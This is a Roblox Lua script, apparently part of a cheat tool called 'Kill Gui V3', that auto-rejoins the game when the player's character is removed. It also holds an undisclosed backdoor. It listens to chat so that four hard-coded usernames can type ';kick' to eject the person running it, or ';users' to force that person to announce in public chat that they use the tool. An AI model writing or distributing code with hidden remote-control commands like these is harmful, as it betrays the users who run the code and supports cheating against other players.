local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local ignoredPlayers = {
    "Player1",
    "Player2Name",
}

local allowedPlayerNames = {
    "Termux_404",
    "ushgd30",
    "cobain_death",
    "Junin_gamer124"
}

local function ShouldIgnorePlayer(player)
    for _, name in ipairs(ignoredPlayers) do
        if player.Name == name then
            return true
        end
    end
    return false
end

local function Rejoin()
    local RejoinCoroutine = coroutine.create(function()
        local Success, ErrorMessage = pcall(function()
            TeleportService:Teleport(game.PlaceId, LocalPlayer)
        end)

        wait(3)

        if Players:GetPlayerByUserId(LocalPlayer.UserId) and not ShouldIgnorePlayer(LocalPlayer) then
            LocalPlayer:Remove()
        end
    end)

    coroutine.resume(RejoinCoroutine)
end

local function OnCharacterChanged()
    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
    humanoidRootPart.AncestryChanged:Connect(function(_, parent)
        if not parent and not ShouldIgnorePlayer(LocalPlayer) then
            Rejoin()
        end
    end)
end

if not ShouldIgnorePlayer(LocalPlayer) then
    OnCharacterChanged()
    LocalPlayer.CharacterAdded:Connect(OnCharacterChanged)
end

local function connectPlayerChat(player)
    player.Chatted:Connect(function(message)
        local playerName = player.Name

        if table.find(allowedPlayerNames, playerName) then
            if string.sub(message, 1, 5) == ";kick" then
                local playerNameToKick = string.sub(message, 7)
                
                local lowerPlayerName = playerNameToKick:lower()
                local lowerLocalPlayerName = game.Players.LocalPlayer.Name:lower()
                local lowerLocalDisplayName = game.Players.LocalPlayer.DisplayName:lower()
                
                if not table.find(allowedPlayerNames, playerNameToKick) then
                    if string.sub(lowerLocalPlayerName, 1, #lowerPlayerName) == lowerPlayerName or 
                       string.sub(lowerLocalDisplayName, 1, #lowerPlayerName) == lowerPlayerName then
                        local localPlayerAllowed = table.find(allowedPlayerNames, game.Players.LocalPlayer.Name)
                        
                        if not localPlayerAllowed then
                            game.Players.LocalPlayer:remove()
                        end
                    end
                end
            elseif string.sub(message, 1, 6) == ";users" then
                local localPlayerName = game.Players.LocalPlayer.Name
                local localPlayerAllowed = table.find(allowedPlayerNames, localPlayerName)

                if not localPlayerAllowed then
                    local args = {
                        [1] = "[ðŸ“¢] I'm using the Kill Gui V3!",
                        [2] = "All"
                    }
                    game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(unpack(args))
                end
            end
        end
    end)
end

local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
local existingGui = playerGui:FindFirstChild("NotificadoComSucesso2")

if not existingGui then
    for _, player in ipairs(Players:GetPlayers()) do
        connectPlayerChat(player)
    end

    Players.PlayerAdded:Connect(function(player)
        connectPlayerChat(player)
    end)

    wait(0.5)

    local gui = Instance.new("ScreenGui")
    gui.Name = "NotificadoComSucesso2"
    gui.ResetOnSpawn = false
    gui.Parent = playerGui
end